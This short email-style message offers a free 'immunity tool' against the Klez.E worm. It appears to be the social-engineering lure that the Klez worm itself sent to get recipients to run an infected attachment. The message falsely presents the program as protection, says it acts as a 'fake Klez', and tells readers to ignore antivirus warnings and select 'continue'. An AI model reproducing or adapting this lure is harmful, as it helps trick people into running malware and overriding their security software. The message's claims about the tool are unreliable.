@_subject: Worm Klez.E immunity 
Klez.E is the most common world-wide spreading worm.It's very dangerous
by corrupting your files.
Because of its very smart stealth and anti-anti-virus technic,most common
AV software can't detect or clean it.
We developed this free immunity tool to defeat the malicious virus.
You only need to run this tool once,and then Klez will never come into
your PC.
NOTE: Because this tool acts as a fake Klez to fool the real worm,some AV
monitor maybe cry when you run it.
If so,Ignore the warning,and select 'continue'.
If you have any question,please mail to me.
